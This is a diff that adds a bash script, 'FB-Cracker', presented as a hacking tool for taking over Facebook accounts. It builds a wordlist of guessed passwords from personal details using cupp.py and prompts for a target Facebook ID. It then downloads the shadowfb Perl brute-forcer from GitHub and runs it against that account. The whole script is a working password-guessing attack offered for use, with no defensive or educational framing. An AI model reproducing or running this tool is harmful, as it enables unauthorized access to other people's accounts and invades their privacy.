@@ -1,0 +1,157 @@
+#!/bin/bash
+
+
+#============================================================================================================
+#	
+#	Welcome To FB-Hacker
+#	FB-Cracker By : Mr.H4CK3R
+#	=======================================
+#	My Facebook Account ::-
+#	https://web.facebook.com/Talaban.Salam1
+#	=======================================
+#	My Youtube Channel ::-
+#	https://www.youtube.com/channel/UCYLHwoVSsozlc3SZb1roWEQ
+#
+#       My Gmail ::-
+#       hamas1276@gmail.com
+#
+#============================================================================================================
+
+
+#This colour
+blue=$(tput bold; tput setaf 6)
+yellow=$(tput bold; tput setaf 3)
+red=$(tput bold; tput setaf 1)
+
+
+
+#Checking
+[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
+resize -s 33 84 > /dev/null
+clear
+
+
+
+# First
+echo "$red"
+echo " _____  _____            _____                     _                "
+echo "|  ___|| ___ \          /  __ \                   | |               "
+echo "| |_   | |_/ /  ______  | /  \/ _ __   __ _   ___ | | __  ___  _ __ "
+echo "|  _|  | ___ \ |______| | |    | '__| / _' | / __|| |/ / / _ \| '__|"
+echo "| |    | |_/ /          | \__/\| |   | (_| || (__ |   < |  __/| |   "
+echo "\_|    \____/            \____/|_|    \__,_| \___||_|\_\ \___||_|   "
+ echo "$yellow"
+echo ""
+echo "Welcome To$red FB-Cracker"
+echo ""
+ echo "$yellow"
+sleep 1
+echo "FB-Cracker By :$red Mr.H4CK3R"
+echo ""
+ echo "$blue"
+sleep 1
+
+
+# Wordlist
+read -p "Do You Want To Create Wordlist?$red [ Y || N ] :$blue " "yn"
+echo ""
+sleep 1
+if [ -z "$yn" ]; then
+echo "No Input!" && exit 0
+fi
+if [[ "$yn" == "Y" || "$yn" == "y" ]]; then
+
+# Create
+echo ""$blue"Please Answer Question For Creating WordList$yellow"
+echo ""
+sleep 1
+python cupp.py -i
+echo ""
+sleep 1
+echo "$blue"
+read -p "Please Enter Your Wordlist Name -$red " "name0"
+echo ""
+sleep 1
+if [ -z "$name0" ]; then
+echo "No Input!" && exit 0
+fi
+clear
+
+
+# Brute Force
+read -p "Please Type Facebook ID -$red " "id";
+echo ""
+ echo "$yellow"
+sleep 1
+if [ -z "$id" ]; then
+echo "no input !" && exit 0
+fi
+if [ ! -f "shadowfb.pl" ]; then
+echo "$red"
+echo "Not found"
+echo ""
+echo -n "shadowfb.pl Not Found ! .. "
+echo ""
+echo "Wait for downloading"
+sleep 2
+echo "$yellow"
+echo ""
+wget https://codeload.github.com/AriPenjweny/shadowfb/zip/master
+unzip master
+rm master
+cd shadowfb-master
+clear
+else
+echo "$blue shadowfb.pl found"
+echo ""
+echo "     ...:$red Please Wait $yellow:..."
+fi
+echo "$red###########################"
+sleep 1
+perl shadowfb.pl $id /root/Desktop/h4ck3r/tools/Facebook_Cracker/$name0
+echo "########################################################"
+fi
+
+
+
+# Finally
+if [[ "$yn" == "N" || "$yn" == "n" ]]; then
+read -p "Please Enter Your Wordlist Name -$red " "name"
+echo ""
+sleep 1
+if [ -z "$name" ]; then
+echo "No Input!" && exit 0
+fi
+echo "$yellow"
+read -p "Please Type Facebook ID -$red " "id";
+echo ""
+ echo "$yellow"
+sleep 1
+if [ -z "$id" ]; then
+echo "no input !" && exit 0
+fi
+if [ ! -f "shadowfb.pl" ]; then
+echo "$red"
+echo "Not found"
+echo ""
+echo -n "shadowfb.pl Not Found ! .. "
+echo ""
+echo "Wait for downloading"
+sleep 2
+echo "$yellow"
+echo ""
+wget https://codeload.github.com/AriPenjweny/shadowfb/zip/master
+unzip master
+rm master
+cd shadowfb-master
+clear
+else
+echo "$blue shadowfb.pl found"
+echo ""
+echo "     ...:$red Please Wait $yellow:..."
+fi
+echo "$red###########################"
+sleep 1
+perl shadowfb.pl $id /root/Desktop/h4ck3r/tools/Facebook_Cracker/$name
+echo "########################################################"
+fi
